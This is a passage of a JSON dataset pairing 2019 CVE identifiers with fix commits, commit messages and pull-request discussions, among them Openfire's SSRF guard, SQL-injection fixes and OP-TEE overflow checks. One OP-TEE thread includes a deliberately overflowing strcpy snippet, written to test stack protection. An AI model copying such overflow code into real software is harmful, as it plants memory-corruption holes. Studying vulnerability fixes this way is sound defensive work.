libopenthread-radio.a | master | 11310 | 0 | 94 | 11404 |\n|  | #4404 | 11310 | 0 | 94 | 11404 |\n|  | +/- | 0 | 0 | 0 | 0 |\n # [Codecov](https://codecov.io/gh/openthread/openthread/pull/4404?src=pr&el=h1) Report\n> Merging [#4404](https://codecov.io/gh/openthread/openthread/pull/4404?src=pr&el=desc) into [master](https://codecov.io/gh/openthread/openthread/commit/57b0f533bb744cc6bd6f1b66ff5c63c9c47616e2?src=pr&el=desc) will **increase** coverage by `0.08%`.\n> The diff coverage is `100%`.\n\n```diff\n@@            Coverage Diff            @@\n##           master   #4404      +/-   ##\n=========================================\n+ Coverage   73.72%   73.8%   +0.08%     \n=========================================\n  Files         353     353              \n  Lines       49432   49434       +2     \n=========================================\n+ Hits        36442   36487      +45     \n+ Misses      12990   12947      -43\n```\n\n\n| [Impacted Files](https://codecov.io/gh/openthread/openthread/pull/4404?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/core/meshcop/commissioner.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvbWVzaGNvcC9jb21taXNzaW9uZXIuY3Bw) | `76.15% <100%> (+0.09%)` | :arrow_up: |\n| [src/core/utils/channel\\_manager.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvdXRpbHMvY2hhbm5lbF9tYW5hZ2VyLmNwcA==) | `80.92% <0%> (-4.63%)` | :arrow_down: |\n| [src/core/mac/mac.hpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvbWFjL21hYy5ocHA=) | `64% <0%> (-4%)` | :arrow_down: |\n| [src/core/thread/address\\_resolver.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvdGhyZWFkL2FkZHJlc3NfcmVzb2x2ZXIuY3Bw) | `81.44% <0%> (\u00f8)` | :arrow_up: |\n| [src/core/thread/mle.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvdGhyZWFkL21sZS5jcHA=) | `92.87% <0%> (+0.1%)` | :arrow_up: |\n| [src/core/thread/mle\\_router.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvdGhyZWFkL21sZV9yb3V0ZXIuY3Bw) | `90% <0%> (+0.18%)` | :arrow_up: |\n| [src/core/thread/mesh\\_forwarder\\_ftd.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvdGhyZWFkL21lc2hfZm9yd2FyZGVyX2Z0ZC5jcHA=) | `88.92% <0%> (+0.29%)` | :arrow_up: |\n| [src/core/thread/mesh\\_forwarder.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvdGhyZWFkL21lc2hfZm9yd2FyZGVyLmNwcA==) | `92.68% <0%> (+1.02%)` | :arrow_up: |\n| [src/core/net/icmp6.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvbmV0L2ljbXA2LmNwcA==) | `82.65% <0%> (+1.02%)` | :arrow_up: |\n| [src/core/mac/data\\_poll\\_sender.cpp](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree#diff-c3JjL2NvcmUvbWFjL2RhdGFfcG9sbF9zZW5kZXIuY3Bw) | `90.05% <0%> (+1.04%)` | :arrow_up: |\n| ... and [5 more](https://codecov.io/gh/openthread/openthread/pull/4404/diff?src=pr&el=tree-more) | |",
            "pr_title_words": 8,
            "comments_words": 678,
            "total_other_info_words": 686
        },
        {
            "cve-id": "CVE-2019-18394",
            "commit_url": "https://github.com/igniterealtime/Openfire/commit/c2ccb38250910587498597955d0bbee8b58e46df",
            "commit_msg": "OF-1885: Guard against SSRF by inpecting favicon results\n\nThe Openfire servlet that is supposed to be used to retrieve favicons from remote servers could be used to obtain anything. To prevent unauthorized use, this commit adds a check that verifies if the returned data is an image. If that's not the case, the returned data is ignored.",
            "commit_msg_words": 57,
            "other_info": "OF-1885: SSRF guard favicon This is good as far as it goes; however I wonder if it could be locked down further? From memory, the favicon is used when displaying S2S sessions. How about restricting the FavIcon servlet to only fetch icons from servers from which a S2S session exists? And the favicon.ico at that?  I've considered that. I'm wondering if the added complexity outweighs the added security benefits. What do you think? Having pondered, I worry that even if we're not displaying it, the admin console will happily fetch any file off any HTTP server it has access to. If it were me, I'd probably lean towards changing the way this works such that the servlet \r\n(a) Only fetches favicon's from S2S connected servers, and\r\n(b) Only fetches the favicon Yeah, you're right. That sounds better to me too. I'm not sure yet if I'll\nhave the time to do this right now. I might raise a ticket as a future\nimprovement to this.\n\nOn Fri, 4 Oct 2019 at 14:47, GregDThomas <notifications@github.com> wrote:\n\n> Having pondered, I worry that even if we're not displaying it, the admin\n> console will happily fetch any file off any HTTP server it has access to.\n> If it were me, I'd probably lean towards changing the way this works such\n> that the servlet\n> (a) Only fetches favicon's from S2S connected servers, and\n> (b) Only fetches the favicon\n>\n> \u2014\n> You are receiving this because you authored the thread.\n> Reply to this email directly, view it on GitHub\n> <https://github.com/igniterealtime/Openfire/pull/1497?email_source=notifications&email_token=ABAORSRY65RJ4KUV4FDTAN3QM43NDA5CNFSM4I5ACFCKYY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGOEALQ6RI#issuecomment-538382149>,\n> or mute the thread\n> <https://github.com/notifications/unsubscribe-auth/ABAORSU6R3XFQLYQLJZGXG3QM43NDANCNFSM4I5ACFCA>\n> .\n>\n > I might raise a ticket as a future improvement to this.\r\n\r\nFiled [OF-1902](https://issues.igniterealtime.org/browse/OF-1902)",
            "pr_title_words": 4,
            "comments_words": 284,
            "total_other_info_words": 288
        },
        {
            "cve-id": "CVE-2019-10664",
            "commit_url": "https://github.com/domoticz/domoticz/commit/ee70db46f81afa582c96b887b73bcd2a86feda00",
            "commit_msg": "Fixed possible SQL Injection Vulnerability (Thanks to Fabio Carretto!)",
            "commit_msg_words": 9,
            "other_info": "Changes for next Release",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2019-1010258",
            "commit_url": "https://github.com/memononen/nanosvg/commit/419782d3d16e88cfa0695aa0b86c956352846712",
            "commit_msg": "Fix decimal values in color fields (nsvg__parseColorRGB)\n\nCloses #136, fixes [CVE-2019-1000032](https://0day.work/cve-2019-1000032-memory-corruption-in-nanosvg/).",
            "commit_msg_words": 11,
            "other_info": "Fix decimal values in color fields (nsvg__parseColorRGB, nsvg__parseColorHex) Thanks for the fix!",
            "pr_title_words": 8,
            "comments_words": 4,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2019-11372",
            "commit_url": "https://github.com/MediaArea/MediaInfoLib/commit/716747fdde2c8dd6d0fca1223362ae5ce533ae38",
            "commit_msg": "x B1101, AVI: fix crash with some invalid streams",
            "commit_msg_words": 9,
            "other_info": "Fix crashes with some invalid streams",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-15477",
            "commit_url": "https://github.com/jooby-project/jooby/commit/34856a738829d8fedca4ed27bd6ff413af87186f",
            "commit_msg": "Avoiding possible XSS attack through the default error handler. See jooby-project/jooby#1366",
            "commit_msg_words": 11,
            "other_info": "Avoiding possible XSS attack through the default error handler I modified the test case very slightly so `org.jooby.DefaultErrHandlerTest#checkErr` now works with a local copy of the map.",
            "pr_title_words": 9,
            "comments_words": 18,
            "total_other_info_words": 27
        },
        {
            "cve-id": "CVE-2019-18213",
            "commit_url": "https://github.com/eclipse/lemminx/commit/c8bf3245a72cace50ee2aae5eee69538c58ce056",
            "commit_msg": "Add disallowDocTypeDecl & resolveExternalEntities validation settings.\n\nSigned-off-by: azerr <azerr@redhat.com>",
            "commit_msg_words": 9,
            "other_info": "Add disallowDocTypeDecl & resolveExternalEntities validation settings Please use the PR from vscode-xml https://github.com/redhat-developer/vscode-xml/pull/187 to customize the 2 settings. [CVE-2019-18213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18213) was opened about this issue.",
            "pr_title_words": 6,
            "comments_words": 18,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2019-15569",
            "commit_url": "https://github.com/hmcts/ccd-data-store-api/commit/c942d5ce847ab1b4acce8753320096e596b42c72",
            "commit_msg": "refactored to prevent sql injection introducing an enum",
            "commit_msg_words": 8,
            "other_info": "Rdm 2523 sql injection fix # [Codecov](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394?src=pr&el=h1) Report\n> Merging [#394](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394?src=pr&el=desc) into [master](https://codecov.io/gh/hmcts/ccd-data-store-api/commit/b2f285851b21c60e51311daff75e1def3f92bf60?src=pr&el=desc) will **increase** coverage by `<.01%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394/graphs/tree.svg?width=650&token=KDzS8LIrac&height=150&src=pr)](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master     #394      +/-   ##\n==========================================\n+ Coverage   95.27%   95.28%   +<.01%     \n==========================================\n  Files         296      297       +1     \n  Lines        6712     6718       +6     \n  Branches      398      398              \n==========================================\n+ Hits         6395     6401       +6     \n  Misses        317      317\n```\n\n\n| [Impacted Files](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [...asedetails/search/SearchQueryFactoryOperation.java](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394/diff?src=pr&el=tree#diff-c3JjL21haW4vamF2YS91ay9nb3YvaG1jdHMvY2NkL2RhdGEvY2FzZWRldGFpbHMvc2VhcmNoL1NlYXJjaFF1ZXJ5RmFjdG9yeU9wZXJhdGlvbi5qYXZh) | `100% <100%> (\u00f8)` | :arrow_up: |\n| [...cts/ccd/data/casedetails/search/SortDirection.java](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394/diff?src=pr&el=tree#diff-c3JjL21haW4vamF2YS91ay9nb3YvaG1jdHMvY2NkL2RhdGEvY2FzZWRldGFpbHMvc2VhcmNoL1NvcnREaXJlY3Rpb24uamF2YQ==) | `100% <100%> (\u00f8)` | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394?src=pr&el=footer). Last update [b2f2858...a83fd48](https://codecov.io/gh/hmcts/ccd-data-store-api/pull/394?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n Verified locally and ready for merge.",
            "pr_title_words": 5,
            "comments_words": 134,
            "total_other_info_words": 139
        },
        {
            "cve-id": "CVE-2019-13115",
            "commit_url": "https://github.com/libssh2/libssh2/commit/b4289eeb84057d3d5e041af72af000a80b4f40d6",
            "commit_msg": "Updated _libssh2_check_length()\n\nUpdated suggested patch to protect against incorrect usage which could cause a wrap-around value to return success.",
            "commit_msg_words": 19,
            "other_info": "Simplified _libssh2_check_length https://blog.semmle.com/libssh2-integer-overflow/ is related to this pull request.",
            "pr_title_words": 2,
            "comments_words": 7,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2019-15939",
            "commit_url": "https://github.com/opencv/opencv/commit/5a497077f109d543ab86dfdf8add1c76c0e47d29",
            "commit_msg": "objdetect: add input check in HOG detector",
            "commit_msg_words": 7,
            "other_info": "objdetect: add input check in HOG detector",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2019-15563",
            "commit_url": "https://github.com/OHDSI/WebAPI/commit/b3944074a1976c95d500239cbbf0741917ed75ca",
            "commit_msg": "fixes SQL injection vulnerability",
            "commit_msg_words": 4,
            "other_info": "fixes SQL injection vulnerability to v2.7.2-rc",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-19004",
            "commit_url": "https://github.com/autotrace/autotrace/commit/64c5833e55d7672d6136a3fbfeae24bd012d36a5",
            "commit_msg": "Check for overflow in row bytes\n\nFixes CVE-2019-19004",
            "commit_msg_words": 8,
            "other_info": "Fix integer overflow and prevent malloc/calloc 0 Looks good to me.",
            "pr_title_words": 7,
            "comments_words": 4,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2019-20387",
            "commit_url": "https://github.com/openSUSE/libsolv/commit/fdb9c9c03508990e4583046b590c30d958f272da",
            "commit_msg": "repodata_schema2id: fix heap-buffer-overflow in memcmp\n\nWhen the length of last schema in data->schemadata is\nless than length of input schema, we got a read overflow\nin asan test.\n\nSigned-off-by: Zhipeng Xie <xiezhipeng1@huawei.com>",
            "commit_msg_words": 32,
            "other_info": "repodata_schema2id: fix heap-buffer-overflow in memcmp Yes, the code assumed that the buffer is tested from left to right, but this is indeed not a valid assumption.",
            "pr_title_words": 5,
            "comments_words": 21,
            "total_other_info_words": 26
        },
        {
            "cve-id": "CVE-2019-14493",
            "commit_url": "https://github.com/opencv/opencv/commit/5691d998ead1d9b0542bcfced36c2dceb3a59023",
            "commit_msg": "core(persistence): added null ptr checks",
            "commit_msg_words": 5,
            "other_info": "core(persistence): added null ptr checks",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2019-1010297",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/a637243270fc1faae16de059091795c32d86e65e",
            "commit_msg": "svc: check for allocation overflow in crypto calls\n\nWithout checking for overflow there is a risk of allocating a buffer\nwith size smaller than anticipated and as a consequence of that it might\nlead to a heap based overflow with attacker controlled data written\noutside the boundaries of the buffer.\n\nFixes: OP-TEE-2018-0010: \"Integer overflow in crypto system calls (x2)\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>",
            "commit_msg_words": 85,
            "other_info": "Fixes for security potential issues reported by Riscure I've seen the Shippable error, I'll have a look at it. > I've seen the Shippable error, I'll have a look at it.\r\n\r\nI've changed the macro to only consider SMALL_PAGE_SIZE, since that is what we check against. Will push a fix soon. Pushed fixes for all (fixable) comments so far. I've saved the ones that has to be done at rebase/force push time. LGTM, you may add my:\r\n\r\n`Acked-by: Jerome Forissier <jerome.forissier@linaro.org>`\r\n\r\n...to all the commits that deal with CFG_ flags. `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments. > `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments.\r\n\r\n@etienne-lms , I'm confused. I cannot see any comments from you. Is GitHub playing me a trick here? Pushed a few more fixes.\r\n\r\nWaiting for:\r\n- Etienne's follow up answers on my replies to his findings.\r\n\r\nTo-do at rebase/force/squash:\r\n- Add Acked-by tags.\r\n- Fix wrong author vs Signed-Off-By.\r\n - Fixed SoB / Author inconsistency.\r\n- Fixed all outstanding review comments.\r\n- Fixed spelling error found by checkpatch / Shippable.\r\n- Added A-B and T-B tags.\r\n\r\nSo, if IBART and friends are happy .... then ...\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks! Sorry, I still have comments on the last 6 commits.\r\n\r\n- \"plat-all: Enable CFG_CORE_STACK_PROTECTOR_STRONG=y by default\" removes `CFG_WITH_STACK_CANARIES ?= y` from `rpi3`. It also enables`CFG_TA_STACK_PROTECTOR_STRONG ?= y` which is introduced in a later commit. Overall I think this commit had better be folded into the parent commit \"core: introduce CFG_CORE_STACK_PROTECTOR_STRONG flag\" (which will also avoid a Travis warning about missing commit description).\r\n- \"ta-dev-kit: enable _FORTIFY_SOURCE=2 on optimized builds\": you say \"shall only be enabled...\", so why isn't it part of commit \"ta-dev-kit: Introduce CFG_TA_FORTIFY_SOURCE\"?\r\n\r\nAlso I think the Travis warnings (missing commit descriptions) should be fixed. When introducing a new flag, we should explain what it does, why we add it, and what is its default value. Things I expect to understand when reading the description are: what is a stack protector? What happens when the \"protection\" detects that something is wrong? Does the TA panic? Does the TEE core panic? Same for the \"fortify\" option.\r\n\r\nIn the end I'd like to have 4 commits:\r\n```\r\n    ta: introduce CFG_TA_STACK_PROTECTOR_STRONG\r\n    ta: introduce CFG_TA_FORTIFY_SOURCE\r\n    core: introduce CFG_CORE_STACK_PROTECTOR_STRONG\r\n    core: introduce CFG_CORE_FORTIFY_SOURCE\r\n```\r\n @jforissier , makes sense. I'll do another clean-up / clarification round, stay tuned. Easier said that done trying to trigger the protectors, since I get data abort when trying to put together examples that should trigger the stack-protector for example. I'd expect some output like \"`*** stack smashing detected ***` at least before the data-abort. @jbech-linaro hard to find documentation, but it looks like the compiler will just call `__stack_chk_fail()`, which we happen to define here: https://github.com/OP-TEE/optee_os/blob/3.3.0/lib/libutils/isoc/stack_check.c\r\nAt least, that's what I can see in the disassembly (`tee.dmp` or `objdump -ldx ta.elf`).\r\n\r\nSo, if I understand correctly, the TA or the TEE core thread would just hang when stack smashing is detected (instead of proceeding with corrupt data). I think I can trigger it successfully now, since without using the flags I get data-aborts, with the flags enabled I get stuck. I've tried to figure out where I am by checking GDB, but so far I haven't been able to make sense out of the address. I'll try to see whether it ends up in `stack_check.c` or not. @jbech-linaro sounds good. Perhaps `__stack_chk_fail()` should `EMSG()` and call `panic()` (`ifdef __KERNEL__`) or `abort()`/`utee_panic()` (user mode TA). Or is there any reason we could not do that in this context? I've tried setting a breakpoint at `__stack_chk_fail`, but it doesn't seem to hang there. But I can see my data (`foo(AAAA...)`) in the `r2` when breaking, so I suspect it is stuck somewhere in strcpy, and/or \"panic\" while(1) as a consequence of this.\r\n```bash\r\nfoo(\"AAAAAAA.....\");\r\n\r\nvoid foo(char *bar) {\r\nchar buffer[16];\r\nstrcpy(buffer, bar)\r\n}\r\n```\r\n\r\n```\r\nr2 = 0x00414141\r\n...\r\n```\r\nI think I will skip the CFG_-patches and submit them as a separate PR if/when I have some time to spare. They weren't really part of the Riscure report, I just added it, since I thought it'd be useful to catch things. > I think I will skip the CFG_-patches [...]\r\n\r\nSure. They are definitely useful IMO, but certainly not required for 3.4.0. Thanks! Two things ....\r\n1. I've removed the CFG patches from this PR and pushed that.\r\n2. I've rebuilt QEMU with SMP=1 and now!!! Lo and behold! I'm stuck in .... drum roll ... `__stack_chk_fail() { while (1) }`.\r\n\r\nSo it seems to work as expected.\r\n\r\nAnyhow, as before, if IBART and friends are happy:\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks!",
            "pr_title_words": 8,
            "comments_words": 780,
            "total_other_info_words": 788
        },
        {
            "cve-id": "CVE-2019-12098",
            "commit_url": "https://github.com/heimdal/heimdal/commit/2f7f3d9960aa6ea21358bdf3687cee5149aa35cf",
            "commit_msg": "CVE-2019-12098: krb5: always confirm PA-PKINIT-KX for anon PKINIT\n\nRFC8062 Section 7 requires verification of the PA-PKINIT-KX key excahnge\nwhen anonymous PKINIT is used.  Failure to do so can permit an active\nattacker to become a man-in-the-middle.\n\nIntroduced by a1ef548600c5bb51cf52a9a9ea12676506ede19f.  First tagged\nrelease Heimdal 1.4.0.\n\nCVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N (4.8)\n\nChange-Id: I6cc1c0c24985936468af08693839ac6c3edda133\nSigned-off-by: Jeffrey Altman <jaltman@auristor.com>\nApproved-by: Jeffrey Altman <jaltman@auritor.com>\n(cherry picked from commit 38c797e1ae9b9c8f99ae4aa2e73957679031fd2b)",
            "commit_msg_words": 61,
            "other_info": "Contents of 7.8.1 release",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2019-20363",
            "commit_url": "https://github.com/igniterealtime/Openfire/commit/b6f758241f3fdd57b48c527a695512f33e26eb74",
            "commit_msg": "Fix issues identified by CSW",
            "commit_msg_words": 5,
            "other_info": "OF-1955: Fix XSS issues identified by CSW",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2019-12982",
            "commit_url": "https://github.com/libming/libming/commit/da9d86eab55cbf608d5c916b8b690f5b76bca462",
            "commit_msg": "decompileAction: Prevent heap buffer overflow and underflow with using OpCode",
            "commit_msg_words": 10,
            "other_info": "Fix several potential vulnerabilities",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2019-19647",
            "commit_url": "https://github.com/radareorg/radare2/commit/07b5e062f2d4a00403ff031302cb18dfa58e3805",
            "commit_msg": "Fix #15545 - Fix NULL derefs after r_file_slurp() fails",
            "commit_msg_words": 9,
            "other_info": "Fix #15545 - Fix NULL derefs after r_file_slurp() fails",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2019-15901",
            "commit_url": "https://github.com/slicer69/doas/commit/6cf0236184ff6304bf5e267ccf7ef02874069697",
            "commit_msg": "fix the setusercontext(3) workaround\n\nSeeing this being used on even more system like Illumos with this ugly\nand security critical bug open makes me cringe every time I check if it\nwas finally fixed.\n\nI reported it directly to the maintainer in 2017. I reported it to\npkgsrc-security@netbsd.org without a response.",
            "commit_msg_words": 51,
            "other_info": "fix the setusercontext(3) workaround Thanks for submitting the patch. Would you care to explain what it is you are trying to fix and why you feel it is a security issue? How is this an improvement over existing behaviour? doas uses [setusercontext(3)](http://man.openbsd.org/setusercontext.3) with the `LOGIN_SETUSER` flag which does `setresuid(3)` and the `LOGIN_SETGROUP` flag which does `initgroups(3)` and `setresgid(2)`.\r\nThe codepath that is used when `HAVE_LOGIN_CAP_H` is not set, only does `setuid(2)` which only sets the uid, the `LOGIN_SETGROUP` path is completely left out.\r\n\r\nThis means your doas port does not drop the groups of the executing user.\r\n\r\n1. This is a big problem if you use doas to run a command with less privileges, which is very security critical, this is not the intended behavior as it is on openbsd, this drastically changes what doas actually does in those cases. (Last time I used a crontab entry to switch from root to a different user as example for such a use case.)\r\n1. If you run a script or program which creates files or directory user and group editable, it will use the executing users group id, which could lead to unintended user writable files. \r\n1. When you have a umask set that would make it group writable, its not as expected root:root, its root:user.\r\n\r\nThe whole point I make is that this is wrong. Both openbsd doas and sudo change the group ids and making this port differ from this behavior without documenting and warning users is very very bad. I have a point of contention with the overall view. One being that I'm not sure this qualifies as a security concern. Having the group of the calling user is arguably expected, or at least certainly useful. However, I can see why, in some cases it would also be dangerous. I'm going to commit this patch and test it. Thank you for putting it together.\r\n\r\nOn a side note, I'd like to point out that my testing shows this issue, keeping the group of the original user, appears to only affect Linux. On FreeBSD group permissions were already dropped, as they were on OpenBSD, and (I think) NetBSD. Linux was the odd one out for keeping the calling user's groups. And I think this patch is worthwhile to bring Linux into the fold so it is no longer an exception.",
            "pr_title_words": 4,
            "comments_words": 387,
            "total_other_info_words": 391
        },
        {
            "cve-id": "CVE-2019-20800",
            "commit_url": "https://github.com/cherokee/webserver/commit/2d4ed5f277ba8d46aa988cdec3935a0650802f0d",
            "commit_msg": "Fix heap buffer overflow handler cgi (#1237)\n\n* Address a memory leak\r\n\r\n* Improve the CGI handler in case of header excess\r\n\r\nIn #1224 it was already pointed out that what issues arise when the number of headers exceed ENV_VAR_NUM. It seems also be the root cause of issue #1225. In addition I guarantee that the envp list always ends with NULL, a required terminal.\r\n\r\n* Introduce a QA-test that would crash Cherokee if more than ENV_VAR_NUM are send in by a client towards Handler CGI.\r\n\r\nFix #1224 and #1225",
            "commit_msg_words": 90,
            "other_info": "Fix heap buffer overflow handler cgi",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-7702",
            "commit_url": "https://github.com/WebAssembly/binaryen/commit/cbb24eb4a0810640c9dcee2f6682c64f9bc6c512",
            "commit_msg": "Misc minor ASAN fixes (#1869)\n\n* handle end of input in skipWhitespace in s-parser. fixes #1863\r\n\r\n* ignore debug locations when not in a function ; fixes #1867\r\n\r\n* error properly on invalid user section sizes ; fixes #1866\r\n\r\n* throw a proper error on invalid call offsets in binary reading ; fixes #1865",
            "commit_msg_words": 54,
            "other_info": "Misc minor ASAN fixes",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2019-15903",
            "commit_url": "https://github.com/libexpat/libexpat/commit/c20b758c332d9a13afbbb276d30db1d183a85d43",
            "commit_msg": "xmlparse.c: Deny internal entities closing the doctype",
            "commit_msg_words": 7,
            "other_info": "[CVE-2019-15903] Deny internal entities closing the doctype (for #317) Unless someone hits the brakes, I'm aiming to merge at Tuesday 2019-09-03 evening, then requesting a CVE, waiting for the CVE request reply, then making a new release. That looks eminently sensible to me.  Is there anything else we should be disallowing from internal entities that we currently allow?  I don't think so, but I haven't looked very hard. Rhodri, thanks for the review!",
            "pr_title_words": 9,
            "comments_words": 64,
            "total_other_info_words": 73
        },
        {
            "cve-id": "CVE-2019-1000020",
            "commit_url": "https://github.com/libarchive/libarchive/commit/8312eaa576014cd9b965012af51bc1f967b12423",
            "commit_msg": "iso9660: Fail when expected Rockridge extensions is missing\n\nA corrupted or malicious ISO9660 image can cause read_CE() to loop\nforever.\n\nread_CE() calls parse_rockridge(), expecting a Rockridge extension\nto be read. However, parse_rockridge() is structured as a while\nloop starting with a sanity check, and if the sanity check fails\nbefore the loop has run, the function returns ARCHIVE_OK without\nadvancing the position in the file. This causes read_CE() to retry\nindefinitely.\n\nMake parse_rockridge() return ARCHIVE_WARN if it didn't read an\nextension. As someone with no real knowledge of the format, this\nseems more apt than ARCHIVE_FATAL, but both the call-sites escalate\nit to a fatal error immediately anyway.\n\nFound with a combination of AFL, afl-rb (FairFuzz) and qsym.",
            "commit_msg_words": 118,
            "other_info": "Fix a 7zip crash and a ISO9660 infinite loop These have been assigned CVEs through the DWF project:\r\n - CVE-2019-1000019 for 65a23f5\r\n - CVE-2019-1000020 for 8312eaa",
            "pr_title_words": 9,
            "comments_words": 17,
            "total_other_info_words": 26
        },
        {
            "cve-id": "CVE-2019-14491",
            "commit_url": "https://github.com/opencv/opencv/commit/321c74ccd6077bdea1d47450ca4fe955cb5b6330",
            "commit_msg": "objdetect: validate feature rectangle on reading",
            "commit_msg_words": 6,
            "other_info": "objdetect: validate feature rectangle on reading :+1:",
            "pr_title_words": 6,
            "comments_words": 1,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2019-1010295",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/d5c5b0b77b2b589666024d219a8007b3f5b6faeb",
            "commit_msg": "core: svc: always check ta parameters\n\nAlways check TA parameters from a user TA. This prevents a user TA from\npassing invalid pointers to a pseudo TA.\n\nFixes: OP-TEE-2018-0007: \"Buffer checks missing when calling pseudo\nTAs\".\n\nSigned-off-by: Jens Wiklander <jens.wiklander@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Joakim Bech <joakim.bech@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>",
            "commit_msg_words": 62,
            "other_info": "Fixes for security potential issues reported by Riscure I've seen the Shippable error, I'll have a look at it. > I've seen the Shippable error, I'll have a look at it.\r\n\r\nI've changed the macro to only consider SMALL_PAGE_SIZE, since that is what we check against. Will push a fix soon. Pushed fixes for all (fixable) comments so far. I've saved the ones that has to be done at rebase/force push time. LGTM, you may add my:\r\n\r\n`Acked-by: Jerome Forissier <jerome.forissier@linaro.org>`\r\n\r\n...to all the commits that deal with CFG_ flags. `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments. > `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments.\r\n\r\n@etienne-lms , I'm confused. I cannot see any comments from you. Is GitHub playing me a trick here? Pushed a few more fixes.\r\n\r\nWaiting for:\r\n- Etienne's follow up answers on my replies to his findings.\r\n\r\nTo-do at rebase/force/squash:\r\n- Add Acked-by tags.\r\n- Fix wrong author vs Signed-Off-By.\r\n - Fixed SoB / Author inconsistency.\r\n- Fixed all outstanding review comments.\r\n- Fixed spelling error found by checkpatch / Shippable.\r\n- Added A-B and T-B tags.\r\n\r\nSo, if IBART and friends are happy .... then ...\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks! Sorry, I still have comments on the last 6 commits.\r\n\r\n- \"plat-all: Enable CFG_CORE_STACK_PROTECTOR_STRONG=y by default\" removes `CFG_WITH_STACK_CANARIES ?= y` from `rpi3`. It also enables`CFG_TA_STACK_PROTECTOR_STRONG ?= y` which is introduced in a later commit. Overall I think this commit had better be folded into the parent commit \"core: introduce CFG_CORE_STACK_PROTECTOR_STRONG flag\" (which will also avoid a Travis warning about missing commit description).\r\n- \"ta-dev-kit: enable _FORTIFY_SOURCE=2 on optimized builds\": you say \"shall only be enabled...\", so why isn't it part of commit 